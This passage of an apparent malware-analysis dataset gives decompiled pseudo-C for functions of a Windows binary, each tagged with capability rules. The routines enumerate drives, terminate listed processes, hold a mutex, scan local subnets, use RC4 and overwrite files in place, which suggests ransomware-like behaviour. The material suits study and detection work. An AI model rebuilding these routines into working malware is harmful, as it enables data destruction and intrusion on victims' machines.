 fcn.0040145e();\n    arg_8h_00 = 0;\ncode_r0x004015cc:\n    if (arg_8h_06 != NULL) {\n        fcn.00404d6a(arg_8h_06);\n    }\n    fcn.00402b7a(arg_8h_01);\n    fcn.00402b7a(arg_8h_02);\n    fcn.00402b7a(arg_8h_03);\n    fcn.00402b7a(arg_8h_04);\n    fcn.00402b7a(arg_8h_05);\n    return arg_8h_00;\n}\n",
        "token_count": 923
    },
    "00401771": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401771(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint var_34h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    \n    arg_8h_00 = fcn.00404cfe(0x28);\n    var_8h = fcn.00407f6a(0, &var_10h);\n    var_ch = fcn.00407f6a(4, 0);\n    var_1ch = &var_34h;\n    var_20h = 0x4091d4;\n    var_18h = 0;\n    var_14h = 0;\n    if (((arg_8h_00 != 0) && (var_8h != 0)) && (var_ch != 0)) {\n        fcn.004085bb();\n        fcn.00404c43(arg_8h_00, 0, 0x28);\n        iVar1 = fcn.004086f0(var_ch, &var_20h);\n        *(arg_8h_00 + 8) = iVar1;\n        if (iVar1 != 0) {\n            iVar1 = fcn.0040149d(arg_8h);\n            *(arg_8h_00 + 0x20) = iVar1;\n            if (iVar1 != 0) {\n                fcn.00404c71(arg_8h_00, var_8h, 6);\n                *(arg_8h_00 + 0x24) = 0;\n                if ((arg_8h != 0) && ((arg_10h & 0x20) != 0)) {\n                    *(arg_8h_00 + 0x24) = 1;\n                }\n                if ((arg_10h & 0x40) != 0) {\n                    *(arg_8h_00 + 0x24) = *(arg_8h_00 + 0x24) | 2;\n                }\n                if ((arg_10h & 0x80) != 0) {\n                    *(arg_8h_00 + 0x24) = *(arg_8h_00 + 0x24) | 4;\n                }\n                goto code_r0x0040183c;\n            }\n        }\n    }\n    fcn.0040174d();\n    arg_8h_00 = 0;\ncode_r0x0040183c:\n    fcn.00402b57(var_8h, var_10h);\n    fcn.00402b7a(var_ch);\n    return arg_8h_00;\n}\n",
        "token_count": 648
    },
    "00401859": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get disk information",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401859(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    uint hostlong;\n    int32_t iVar3;\n    uint arg_ch;\n    uint uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    uint uStack24;\n    uint uStack20;\n    uint32_t uStack16;\n    char16_t cStack12;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n    uVar6 = 0;\n    arg_8h_00 = fcn.00407f6a(0x14, 0);\n    uStack24 = str._X:._0_4_;\n    uStack20 = str._X:._4_4_;\n    uStack16 = str._X:._8_4_;\n    cStack12 = str._X:[6];\n    iVar2 = fcn.004043ed();\n    hostlong = fcn.00402e19();\n    if (arg_8h_00 != 0) {\n        if (iVar2 == 0) goto code_r0x00401967;\n        iVar3 = fcn.00404d94(arg_8h_00);\n        if (iVar3 != 0) {\n            do {\n                iVar3 = fcn.00404c0c();\n                if (iVar3 != 0) break;\n                if ((uVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                    uVar7 = arg_8h[2];\n                    uVar4 = *arg_8h;\n                    uStack16 = uStack16 & 0xffff0000 | *(arg_8h_00 + uVar6 * 2);\n                    arg_ch = fcn.0040160b(hostlong);\n                    iVar3 = fcn.00404b5c(&uStack24, arg_ch, uVar4, uVar7);\n                    if (iVar3 != 0) {\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n                    }\n                    iVar3 = arg_8h[1];\n                    if (iVar3 != 0) {\n                        uVar7 = arg_8h[2];\n                        uVar4 = fcn.0040160b(hostlong);\n                        iVar3 = fcn.00404b5c(&uStack24, uVar4, iVar3, uVar7);\n                        if (iVar3 != 0) {\n                            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n                        }\n                    }\n                }\n                uVar6 = uVar6 + 1;\n                uVar5 = fcn.00404d94(arg_8h_00);\n            } while (uVar6 < uVar5);\n        }\n        fcn.0040450c();\n    }\n    if (iVar2 != 0) {\n        fcn.004043bf();\n    }\ncode_r0x00401967:\n    fcn.00402b7a(arg_8h_00);\n    return 0;\n}\n",
        "token_count": 692
    },
    "0040208b": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0040208b(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint lpExitCode;\n    int32_t hHandle;\n    uint var_4h;\n    \n    iVar4 = 0x32;\n    var_4h = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateEventW)(0, 0, 0, 0);\n    if (iVar2 != 0) {\n        hHandle = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004035e3, iVar2, 0, 0);\n        do {\n            iVar4 = iVar4 + -1;\n            iVar3 = fcn.0040405b(1);\n            if (iVar3 == 0) {\n                var_4h = 1;\n                break;\n            }\n            (*_sym.imp.KERNEL32.dll_Sleep)(100);\n        } while (iVar4 != 0);\n        (*_sym.imp.KERNEL32.dll_SetEvent)(iVar2);\n        iVar4 = hHandle;\n        lpExitCode = 0;\n        iVar3 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hHandle, 0xffffffff);\n        if (iVar3 == 0) {\n            (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(iVar4, &lpExitCode);\n        }\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        if (iVar4 != 0) {\n            (*pcVar1)(iVar4);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 378
    },
    "0040266b": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040266b(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t arg_10h;\n    int32_t *unaff_ESI;\n    \n    uVar1 = 0;\n    if (arg_ch <= unaff_ESI[5] - unaff_ESI[4]) {\n        uVar1 = unaff_ESI[3];\n        if ((uVar1 < unaff_ESI[2]) || (arg_10h = unaff_ESI[1] - uVar1,  arg_ch <= arg_10h)) {\n            fcn.00404c71(uVar1, arg_8h, arg_ch);\n            unaff_ESI[3] = unaff_ESI[3] + arg_ch;\n        }\n        else {\n            fcn.00404c71(uVar1, arg_8h, arg_10h);\n            fcn.00404c71(*unaff_ESI, arg_10h + arg_8h, arg_ch - arg_10h);\n            unaff_ESI[3] = *unaff_ESI + (arg_ch - arg_10h);\n        }\n        unaff_ESI[4] = unaff_ESI[4] + arg_ch;\n        uVar1 = arg_ch;\n    }\n    return uVar1;\n}\n",
        "token_count": 303
    },
    "004026d0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004026d0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t arg_10h;\n    int32_t *unaff_ESI;\n    \n    uVar1 = 0;\n    if (arg_ch <= unaff_ESI[4]) {\n        uVar1 = unaff_ESI[2];\n        if ((uVar1 < unaff_ESI[3]) || (arg_10h = unaff_ESI[1] - uVar1,  arg_ch <= arg_10h)) {\n            fcn.00404c71(arg_8h, uVar1, arg_ch);\n            unaff_ESI[2] = unaff_ESI[2] + arg_ch;\n        }\n        else {\n            fcn.00404c71(arg_8h, uVar1, arg_10h);\n            fcn.00404c71(arg_10h + arg_8h, *unaff_ESI, arg_ch - arg_10h);\n            unaff_ESI[2] = *unaff_ESI + (arg_ch - arg_10h);\n        }\n        unaff_ESI[4] = unaff_ESI[4] - arg_ch;\n        uVar1 = arg_ch;\n    }\n    return uVar1;\n}\n",
        "token_count": 295
    },
    "00403355": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403355(uint noname_0, uint arg_ch, int32_t *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_210h;\n    \n    if ((*arg_10h == 0x10) && (*(arg_10h + 0xb) == 0x76)) {\n        iVar1 = fcn.0040861d(&var_210h, 0x104, 3);\n        if (iVar1 != 0) {\n            iVar1 = fcn.004031b5(2, &var_210h, 0, 0, *(arg_14h + 8));\n            *(arg_14h + 0xc) = *(arg_14h + 0xc) + (0 < iVar1);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 193
    },
    "00403933": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00403933(void)\n\n{\n    code *pcVar1;\n    int32_t arg_8h;\n    int32_t iVar2;\n    uint var_60h;\n    uint var_5ch;\n    uint var_18h;\n    uint var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    arg_8h = fcn.00404cfe(0x20a);\n    var_60h = 0;\n    fcn.00404c43(&var_5ch, 0, 0x40);\n    var_18h = 0;\n    var_14h = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    fcn.00402e5c(&var_8h, 0);\n    if (arg_8h != 0) {\n        iVar2 = fcn.0040854d(arg_8h);\n        if (iVar2 != 0) {\n            var_60h = 0x44;\n            var_4h = (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, arg_8h, 0, 0, 0, 0, 0, 0, &var_60h, &var_18h);\n            pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n            if (var_4h != 0) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_18h);\n                (*pcVar1)(var_14h);\n            }\n        }\n    }\n    fcn.00402e5c(var_8h, 1);\n    if (arg_8h != 0) {\n        fcn.00404d6a(arg_8h);\n    }\n    return var_4h;\n}\n",
        "token_count": 422
    },
    "00403e82": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate processes/f67bedfed7e245aa9b0908c198426ab8",
            "contain loop",
            "terminate process",
            "enumerate processes"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403e82(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int16_t *extraout_EDX;\n    int16_t *piVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint var_238h;\n    uint dwProcessId;\n    uint var_214h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t hObject;\n    \n    var_8h = 0;\n    hObject = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    if (hObject != 0) {\n        fcn.00404c43(&var_238h, 0, 0x22c);\n        var_238h = 0x22c;\n        iVar3 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(hObject, &var_238h);\n        while (iVar3 != 0) {\n            var_ch = 0;\n            piVar4 = arg_8h;\n            if (arg_8h != NULL) {\n                while (*piVar4 != 0) {\n                    puVar6 = &var_214h;\n                    while (((iVar1 = *piVar4,  iVar1 != 0 && (*puVar6 != 0)) &&\n                           (iVar2 = fcn.00408681(),  piVar4 = extraout_EDX,  iVar1 == iVar2))) {\n                        puVar6 = puVar6 + 2;\n                        piVar4 = extraout_EDX + 1;\n                    }\n                    iVar3 = var_ch;\n                    if (*piVar4 == *puVar6) goto code_r0x00403ee8;\n                    var_ch = var_ch + 1;\n                    do {\n                        iVar1 = *piVar4;\n                        piVar4 = piVar4 + 1;\n                    } while (iVar1 != 0);\n                }\n            }\n            iVar3 = -1;\ncode_r0x00403ee8:\n            if (-1 < iVar3) {\n                iVar5 = 0;\n                iVar3 = (*_sym.imp.KERNEL32.dll_OpenProcess)(1, 0, dwProcessId);\n                if (iVar3 != 0) {\n                    iVar5 = (*_sym.imp.KERNEL32.dll_TerminateProcess)(iVar3, 0);\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n                }\n                var_8h = var_8h + iVar5;\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_Process32NextW)(hObject, &var_238h);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return var_8h;\n}\n",
        "token_count": 618
    },
    "00403f8c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create mutex",
            "check mutex and exit"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403f8c(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t *unaff_ESI;\n    bool bVar2;\n    uint var_4ch;\n    uint *var_48h;\n    char16_t *var_44h;\n    uint *var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_20h;\n    uint var_ch;\n    \n    fcn.00402e19();\n    var_ch = fcn.00407f6a(0x19, 0);\n    var_48h = &var_20h;\n    var_40h = &var_34h;\n    var_4ch = 0x4091d4;\n    var_44h = L\"ELVL\";\n    var_3ch = 0;\n    var_38h = 0;\n    *unaff_ESI = 0;\n    fcn.004085bb();\n    fcn.004085bb();\n    arg_8h_00 = fcn.004086f0(var_ch, &var_4ch);\n    if (arg_8h_00 == 0) {\n        bVar2 = false;\n    }\n    else {\n        iVar1 = (*_sym.imp.KERNEL32.dll_OpenMutexW)(0x100000, 0, arg_8h_00);\n        *unaff_ESI = iVar1;\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0, arg_8h_00);\n            *unaff_ESI = iVar1;\n            if (iVar1 == 0) {\n                bVar2 = false;\n                goto code_r0x00404043;\n            }\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*unaff_ESI, 0);\n        bVar2 = iVar1 == 0;\n        if (bVar2) goto code_r0x00404043;\n    }\n    if (*unaff_ESI != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*unaff_ESI);\n        *unaff_ESI = 0;\n    }\ncode_r0x00404043:\n    fcn.00402b7a(var_ch);\n    fcn.00402b7a(arg_8h_00);\n    return bVar2;\n}\n",
        "token_count": 551
    },
    "0040408a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040408a(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_224h;\n    uint32_t var_11ch;\n    uint var_118h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetTickCount;\n    iVar3 = 0;\n    var_8h = 0;\n    var_14h = 0;\n    var_10h = 10000;\n    var_ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    iVar2 = (*pcVar1)();\n    while (iVar2 - var_ch < 1000) {\n        var_11ch = 0x40;\n        if (0x200U - iVar3 < 0x41) {\n            var_11ch = 0x200U - iVar3;\n        }\n        fcn.00404c71(&var_118h, arg_8h + iVar3 * 4, var_11ch);\n        iVar3 = iVar3 + var_11ch;\n        fcn.00404c71(&var_224h, &var_11ch, 0x104);\n        iVar2 = (*_sym.imp.WS2_32.dll_select)(0, &var_11ch, 0, &var_224h, &var_14h);\n        var_8h = var_8h | 0 < iVar2;\n        iVar2 = (*pcVar1)();\n    }\n    return var_8h;\n}\n",
        "token_count": 372
    },
    "00404311": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404311(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint32_t *arg_8h_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint32_t *puStack24;\n    uint auStack20 [2];\n    uint32_t *puStack12;\n    \n    auStack20[0] = 15000;\n    arg_8h_00 = fcn.00404cfe(15000);\n    if (arg_8h_00 != NULL) {\n        puStack12 = arg_8h_00;\n        iVar2 = (*_sym.imp.IPHLPAPI.DLL_GetIpAddrTable)(arg_8h_00, auStack20, 0);\n        pcVar1 = _sym.imp.WS2_32.dll_ntohl;\n        if ((iVar2 == 0) && (uVar6 = 0,  *arg_8h_00 != 0)) {\n            puVar5 = arg_8h_00 + 1;\n            do {\n                iVar2 = (*pcVar1)(*puVar5);\n                if (iVar2 != 0x7f000001) {\n                    uVar3 = (*pcVar1)(*puVar5);\n                    uVar4 = (*pcVar1)(puVar5[2]);\n                    fcn.00404148(uVar4 & uVar3, arg_8h);\n                    fcn.00404148(uVar3 + 1, arg_8h);\n                    arg_8h_00 = puStack24;\n                }\n                uVar6 = uVar6 + 1;\n                puVar5 = puVar5 + 6;\n            } while (uVar6 < *arg_8h_00);\n        }\n        fcn.00404d6a(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 433
    },
    "00404e69": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00404e69(int16_t *arg_8h, uint arg_ch)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    \n    piVar2 = arg_8h;\n    do {\n        iVar1 = *piVar2;\n        piVar2 = piVar2 + 1;\n    } while (iVar1 != 0);\n    do {\n        piVar2 = piVar2 + -1;\n        if (piVar2 == arg_8h) break;\n    } while (*piVar2 != arg_ch);\n    if (*piVar2 != arg_ch) {\n        piVar2 = NULL;\n    }\n    return piVar2;\n}\n",
        "token_count": 156
    },
    "004055cc": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004055cc(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t unaff_ESI;\n    bool bVar5;\n    uint32_t var_1ch;\n    uint32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    \n    var_ch = 0;\n    fcn.00404c43(*(unaff_ESI + 0x20), 0, *(unaff_ESI + 0x24));\n    pcVar1 = _sym.imp.KERNEL32.dll_SetFilePointerEx;\n    var_14h = 0;\n    var_10h = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(arg_8h, 0, 0, &var_14h, 2);\n    iVar4 = var_10h;\n    if (iVar2 != 0) {\n        var_1ch = var_14h;\n        var_14h = 0;\n        var_10h = 0;\n        iVar2 = (*pcVar1)(arg_8h, 0, 0, &var_14h, 0);\n        pcVar1 = _sym.imp.KERNEL32.dll_WriteFile;\n        if (iVar2 != 0) {\n            uVar3 = *(unaff_ESI + 0x24);\n            if (iVar4 == 0) goto code_r0x00405667;\n            do {\n                do {\n                    iVar2 = (*pcVar1)(arg_8h, *(unaff_ESI + 0x20), uVar3, &var_8h, 0);\n                    if (iVar2 == 0) {\n                        return var_ch;\n                    }\n                    uVar3 = *(unaff_ESI + 0x24);\n                    if (var_8h < uVar3) {\n                        return var_ch;\n                    }\n                    bVar5 = var_1ch < uVar3;\n                    var_1ch = var_1ch - uVar3;\n                    iVar4 = iVar4 - bVar5;\n                } while (iVar4 != 0);\ncode_r0x00405667:\n            } while (uVar3 < var_1ch);\n            iVar4 = (*pcVar1)(arg_8h, *(unaff_ESI + 0x20), var_1ch, &var_8h, 0);\n            if ((iVar4 != 0) && (var_1ch <= var_8h)) {\n                var_ch = 1;\n            }\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 599
    },
    "004066a9": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004066a9(uint arg_8h, int32_t arg_ch, uint32_t *arg_10h)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int16_t *piVar3;\n    uint16_t uVar4;\n    int32_t unaff_EBX;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_8h = *(unaff_EBX + 4);\n    fcn.00406284();\n    puVar2 = *(unaff_EBX + 0xc);\n    piVar3 = *(arg_ch + 0xc);\n    do {\n        uVar4 = *puVar2 - *piVar3;\n        uVar1 = uVar4 - var_4h;\n        piVar3 = piVar3 + 1;\n        var_4h = *puVar2 < uVar4 || uVar4 < uVar1;\n        *puVar2 = uVar1;\n        puVar2 = puVar2 + 1;\n        var_8h = var_8h + -1;\n    } while (var_8h != 0);\n    if (arg_10h != NULL) {\n        *arg_10h = var_4h;\n    }\n    fcn.004061e8();\n    fcn.0040634a();\n    fcn.004061e8();\n    return;\n}\n",
        "token_count": 326
    },
    "00407f6a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407f6a(int32_t arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t arg_8h_00;\n    int32_t arg_8h_01;\n    int32_t iVar5;\n    uchar auStack320 [16];\n    uchar auStack304 [300];\n    \n    piVar3 = *0x40a4a0;\n    iVar5 = (*0x40a4a0)[1];\n    if (iVar5 != 0) {\n        iVar1 = **0x40a4a0;\n        piVar4 = iVar5 * 0xc + iVar1;\n        do {\n            piVar4 = piVar4 + -3;\n            iVar5 = iVar5 + -1;\n            if (*piVar4 == arg_8h) {\n                iVar5 = iVar5 * 0xc;\n                uVar2 = *(iVar1 + 8 + iVar5);\n                arg_8h_00 = (uVar2 - (uVar2 & 0xf)) + 0x10;\n                arg_8h_01 = fcn.00404cfe(arg_8h_00);\n                if (arg_8h_01 == 0) {\n                    return 0;\n                }\n                fcn.00404c71(arg_8h_01, *(iVar1 + 4 + iVar5) + piVar3[2], arg_8h_00);\n                fcn.00404c43(auStack320, 0, 0x10);\n                fcn.00407cb0(piVar3 + 4, auStack320);\n                fcn.00407ddf(auStack304, arg_8h_01);\n                fcn.004076e5(auStack304);\n                if (arg_ch == NULL) {\n                    return arg_8h_01;\n                }\n                *arg_ch = *(*piVar3 + 8 + iVar5);\n                return arg_8h_01;\n            }\n        } while (iVar5 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 485
    },
    "004080fa": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004080fa(char *arg_8h, int32_t arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    uint32_t arg_14h_00;\n    uint32_t uVar5;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h._0_2_ = *0x40a460;\n    var_4h._2_1_ = *0x40a462;\n    var_8h._0_2_ = *0x40a464;\n    var_8h._2_1_ = *0x40a466;\n    iVar2 = fcn.00404f16(arg_8h, &var_4h);\n    arg_14h_00 = arg_10h;\n    if (iVar2 != 0) {\n        do {\n            uVar5 = iVar2 - arg_8h;\n            if (arg_14h_00 < uVar5) {\n                return 0;\n            }\n            fcn.00404c71(arg_ch, arg_8h, uVar5);\n            arg_ch = arg_ch + uVar5;\n            pcVar4 = arg_8h + uVar5;\n            iVar2 = iVar2 + 2;\n            arg_14h_00 = arg_14h_00 - uVar5;\n            iVar3 = fcn.00404f16(iVar2, &var_8h);\n            arg_8h = pcVar4;\n            if (iVar3 == 0) break;\n            uVar5 = fcn.00408047(iVar2, iVar3 - iVar2, arg_ch, arg_14h_00, arg_14h);\n            if (arg_14h_00 < uVar5) {\n                return 0;\n            }\n            arg_ch = arg_ch + uVar5;\n            arg_14h_00 = arg_14h_00 - uVar5;\n            arg_8h = iVar3 + 2;\n            if (uVar5 == 0) {\n                uVar5 = arg_8h - pcVar4;\n                if (arg_14h_00 < uVar5) {\n                    return 0;\n                }\n                fcn.00404c71(arg_ch, pcVar4, uVar5);\n                arg_ch = arg_ch + uVar5;\n                arg_14h_00 = arg_14h_00 - uVar5;\n            }\n            iVar2 = fcn.00404f16(arg_8h, &var_4h);\n        } while (iVar2 != 0);\n        if (arg_14h_00 < uVar5) {\n            return 0;\n        }\n    }\n    pcVar4 = arg_8h;\n    do {\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    uVar5 = pcVar4 - (arg_8h + 1);\n    if (arg_14h_00 < uVar5) {\n        return 0;\n    }\n    fcn.00404c71(arg_ch, arg_8h, uVar5);\n    *(uVar5 + arg_ch) = 0;\n    return (uVar5 - arg_14h_00) + arg_10h;\n}\n",
        "token_count": 781
    },
    "00408207": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408207(int16_t *arg_8h, uint32_t arg_ch, code *arg_10h, uint arg_14h)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint32_t uVar4;\n    uint var_18h;\n    ushort uStack24;\n    uint var_10h;\n    ushort uStack16;\n    int16_t *var_8h;\n    uint32_t var_4h;\n    \n    var_10h = *0x40a450;\n    uStack16 = *0x40a454;\n    var_4h = arg_ch;\n    var_18h = *0x40a458;\n    uStack24 = *0x40a45c;\n    iVar2 = fcn.00404eb8(arg_8h, &var_10h);\n    if (iVar2 != 0) {\n        do {\n            uVar4 = iVar2 - arg_8h >> 1;\n            if (var_4h < uVar4) {\n                return 0;\n            }\n            fcn.00404c71(in_EAX, arg_8h, uVar4 * 2);\n            var_4h = var_4h - uVar4;\n            arg_8h = arg_8h + uVar4;\n            iVar2 = iVar2 + 4;\n            in_EAX = in_EAX + uVar4 * 2;\n            var_8h = fcn.00404eb8(iVar2, &var_18h);\n            if (var_8h == NULL) break;\n            uVar4 = (*arg_10h)(iVar2, var_8h - iVar2 >> 1, in_EAX, var_4h, arg_14h);\n            if (var_4h < uVar4) {\n                return 0;\n            }\n            var_4h = var_4h - uVar4;\n            var_8h = var_8h + 2;\n            in_EAX = in_EAX + uVar4 * 2;\n            if (uVar4 == 0) {\n                uVar4 = var_8h - arg_8h >> 1;\n                if (var_4h < uVar4) {\n                    return 0;\n                }\n                fcn.00404c71(in_EAX, arg_8h, uVar4 * 2);\n                in_EAX = in_EAX + uVar4 * 2;\n                var_4h = var_4h - uVar4;\n            }\n            arg_8h = var_8h;\n            iVar2 = fcn.00404eb8(var_8h, &var_10h);\n        } while (iVar2 != 0);\n        if (var_4h < uVar4) {\n            return 0;\n        }\n    }\n    piVar3 = arg_8h;\n    do {\n        iVar1 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar1 != 0);\n    uVar4 = piVar3 - (arg_8h + 1) >> 1;\n    if (var_4h < uVar4) {\n        return 0;\n    }\n    fcn.00404c71(in_EAX, arg_8h, uVar4 * 2);\n    *(uVar4 * 2 + in_EAX) = 0;\n    return (uVar4 - var_4h) + arg_ch;\n}\n",
        "token_count": 791
    },
    "0040877a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040877a(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int16_t iVar1;\n    int16_t *arg_8h_00;\n    int32_t iVar2;\n    ushort *puVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    uint uVar6;\n    \n    uVar6 = 0;\n    arg_8h_00 = fcn.00404cfe(0x20a);\n    if (arg_8h_00 != NULL) {\n        iVar2 = fcn.0040854d(arg_8h_00);\n        if (iVar2 != 0) {\n            if ((arg_ch == 0) && (puVar3 = fcn.00404e69(arg_8h_00, 0x2e),  puVar3 != NULL)) {\n                *puVar3 = 0;\n            }\n            iVar2 = fcn.00404e69(arg_8h_00, 0x5c);\n            piVar4 = arg_8h_00;\n            if (iVar2 != 0) {\n                piVar4 = iVar2 + 2;\n            }\n            piVar5 = piVar4;\n            do {\n                iVar1 = *piVar5;\n                piVar5 = piVar5 + 1;\n            } while (iVar1 != 0);\n            if (piVar5 - (piVar4 + 1) >> 1 < 0x105) {\n                arg_8h = arg_8h - piVar4;\n                do {\n                    iVar1 = *piVar4;\n                    *(arg_8h + piVar4) = iVar1;\n                    piVar4 = piVar4 + 1;\n                } while (iVar1 != 0);\n                uVar6 = 1;\n            }\n        }\n        fcn.00404d6a(arg_8h_00);\n    }\n    return uVar6;\n}\n",
        "token_count": 436
    },
    "004025c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
